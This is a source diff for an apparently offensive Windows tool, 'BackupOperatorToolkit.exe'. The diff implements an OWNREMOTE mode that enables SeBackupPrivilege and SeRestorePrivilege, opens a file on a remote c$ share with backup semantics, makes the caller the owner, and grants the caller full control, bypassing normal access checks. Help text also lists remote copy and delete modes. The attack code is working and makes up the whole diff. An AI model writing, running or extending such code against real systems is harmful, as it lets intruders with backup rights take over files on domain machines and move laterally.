@@ -4,6 +4,8 @@
 #include <algorithm>
 #include <cctype>
 #include <Windows.h>
+#include <vector>
+#include <Aclapi.h>
 
 LPCSTR mode = NULL;
 LPCSTR behaviour = NULL;
@@ -13,7 +15,6 @@ LPCSTR target = NULL;
 LPCSTR servicename = NULL;
 LPCSTR displayname = NULL;
 LPCSTR description = NULL;
-LPCSTR username = NULL;
 LPCSTR password = NULL;
 LPCSTR domain = NULL;
 LPCSTR ifeoservice = NULL;
@@ -185,7 +186,7 @@ void help(){
 	printf("Usage: BackupOperatorToolkit.exe COPYREMOTE C:\\LocalPath\\File.txt \\\\TARGET.DOMAIN.COM\\c$\\temp\\");
 	printf("Usage: BackupOperatorToolkit.exe COPYLOCAL C:\\LocalPath\\ \\\\TARGET.DOMAIN.COM\\c$\\temp\\file.txt");
 	printf("Usage: BackupOperatorToolkit.exe DELREMOTE \\\\TARGET.DOMAIN.COM\\c$\\temp\\file.txt");
-	printf("Usage: BackupOperatorToolkit.exe OWNREMOTE CORP1\\stdusr \\\\TARGET.DOMAIN.COM\\c$\\temp\\file.txt");
+	printf("Usage: BackupOperatorToolkit.exe OWNREMOTE \\\\TARGET.DOMAIN.COM\\c$\\temp\\file.txt");
 }
 
 void service(){
@@ -1097,9 +1098,136 @@ void delremote(){
 }
 
 void ownremote(){
-	// TODO: Modify the security descriptor of a remote file over SMB on the remote computer using File_open_for_backup_intent in the SMB protocol as explained in https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e8fb45c1-a03d-44ca-b7ae-47385cfd7997  The goal here is to write to the file's security descriptor using SeRestorePrivilege instead of relying on standard dacl checks without otherwise altering the contents of the file.  The new Owner of the file should be the security principal that is calling the function.  This function should also add an Allow Full Control ACE on the security descriptor of the remote file.
+	const char* remotePath = target;
 
+	if ((remotePath == NULL || remotePath[0] == '\0') && behaviour && behaviour[0] != '\0') {
+		remotePath = behaviour;
+	}
+	if ((remotePath == NULL || remotePath[0] == '\0') && dumppath && dumppath[0] != '\0') {
+		remotePath = dumppath;
+	}
 
+	if (remotePath == NULL || remotePath[0] == '\0') {
+		printf("[-] Remote file path is missing.\n");
+		return;
+	}
+
+	if (!EnablePrivilege(SE_BACKUP_NAME)) {
+		printf("[-] Unable to enable SeBackupPrivilege.\n");
+		return;
+	}
+
+	if (!EnablePrivilege(SE_RESTORE_NAME)) {
+		printf("[-] Unable to enable SeRestorePrivilege.\n");
+		return;
+	}
+
+	HANDLE processToken = NULL;
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &processToken)) {
+		DWORD error = GetLastError();
+		std::string message = FormatErrorMessage(error);
+		printf("[-] OpenProcessToken failed: %lu - %s\n", error, message.c_str());
+		return;
+	}
+
+	DWORD tokenInfoLength = 0;
+	GetTokenInformation(processToken, TokenUser, NULL, 0, &tokenInfoLength);
+	if (tokenInfoLength == 0) {
+		DWORD error = GetLastError();
+		std::string message = FormatErrorMessage(error);
+		printf("[-] GetTokenInformation size query failed: %lu - %s\n", error, message.c_str());
+		CloseHandle(processToken);
+		return;
+	}
+
+	std::vector<BYTE> tokenBuffer(tokenInfoLength);
+	if (!GetTokenInformation(processToken, TokenUser, tokenBuffer.data(), tokenInfoLength, &tokenInfoLength)) {
+		DWORD error = GetLastError();
+		std::string message = FormatErrorMessage(error);
+		printf("[-] GetTokenInformation failed: %lu - %s\n", error, message.c_str());
+		CloseHandle(processToken);
+		return;
+	}
+
+	CloseHandle(processToken);
+
+	PTOKEN_USER tokenUser = reinterpret_cast<PTOKEN_USER>(tokenBuffer.data());
+	PSID callerSid = tokenUser ? tokenUser->User.Sid : NULL;
+	if (callerSid == NULL || !IsValidSid(callerSid)) {
+		printf("[-] Caller SID is invalid.\n");
+		return;
+	}
+
+	std::wstring remotePathW = ConvertToWide(remotePath);
+	if (remotePathW.empty()) {
+		printf("[-] Failed to convert remote path to wide string.\n");
+		return;
+	}
+
+	std::wstring extendedRemotePath = BuildExtendedPath(remotePathW);
+
+	HANDLE remoteHandle = CreateFileW(
+		extendedRemotePath.c_str(),
+		WRITE_DAC | WRITE_OWNER | READ_CONTROL,
+		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS | FILE_OPEN_FOR_BACKUP_INTENT,
+		NULL);
+	if (remoteHandle == INVALID_HANDLE_VALUE) {
+		DWORD error = GetLastError();
+		std::string message = FormatErrorMessage(error);
+		printf("[-] CreateFileW (remote: %s) failed: %lu - %s\n", remotePath, error, message.c_str());
+		return;
+	}
+
+	PSECURITY_DESCRIPTOR securityDescriptor = NULL;
+	PACL existingDacl = NULL;
+	PSID existingOwner = NULL;
+	DWORD securityResult = GetSecurityInfo(remoteHandle, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, &existingOwner, NULL, &existingDacl, NULL, &securityDescriptor);
+	if (securityResult != ERROR_SUCCESS) {
+		std::string message = FormatErrorMessage(securityResult);
+		printf("[-] GetSecurityInfo failed: %lu - %s\n", securityResult, message.c_str());
+		CloseHandle(remoteHandle);
+		return;
+	}
+
+	EXPLICIT_ACCESSW accessEntry = {};
+	accessEntry.grfAccessPermissions = GENERIC_ALL;
+	accessEntry.grfAccessMode = GRANT_ACCESS;
+	accessEntry.grfInheritance = NO_INHERITANCE;
+	accessEntry.Trustee.TrusteeForm = TRUSTEE_IS_SID;
+	accessEntry.Trustee.TrusteeType = TRUSTEE_IS_USER;
+	accessEntry.Trustee.ptstrName = reinterpret_cast<LPWSTR>(callerSid);
+
+	PACL updatedDacl = NULL;
+	DWORD aclResult = SetEntriesInAclW(1, &accessEntry, existingDacl, &updatedDacl);
+	if (aclResult != ERROR_SUCCESS) {
+		std::string message = FormatErrorMessage(aclResult);
+		printf("[-] SetEntriesInAclW failed: %lu - %s\n", aclResult, message.c_str());
+		if (securityDescriptor) {
+			LocalFree(securityDescriptor);
+		}
+		CloseHandle(remoteHandle);
+		return;
+	}
+
+	DWORD setResult = SetSecurityInfo(remoteHandle, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, callerSid, NULL, updatedDacl, NULL);
+	if (setResult != ERROR_SUCCESS) {
+		std::string message = FormatErrorMessage(setResult);
+		printf("[-] SetSecurityInfo failed: %lu - %s\n", setResult, message.c_str());
+	}
+	else {
+		printf("[+] Updated owner and DACL for %s using SeRestorePrivilege.\n", remotePath);
+	}
+
+	if (updatedDacl) {
+		LocalFree(updatedDacl);
+	}
+	if (securityDescriptor) {
+		LocalFree(securityDescriptor);
+	}
+	CloseHandle(remoteHandle);
 }
 
 int main(int argc, LPCSTR argv[])
@@ -1172,6 +1300,15 @@ int main(int argc, LPCSTR argv[])
 		servicepath = argv[2];
 		target = argv[3];
 		copyremote();
+	}
+	else if (strcmp(mode, "OWNREMOTE") == 0) {
+		if (argc < 3) {
+			help();
+			return 0;
+		}
+		printf("OWNREMOTE MODE\n");
+		target = argv[2];
+		ownremote();
 	}
 	else if (strcmp(mode, "DELREMOTE") == 0) {
 		if (argc < 3) {
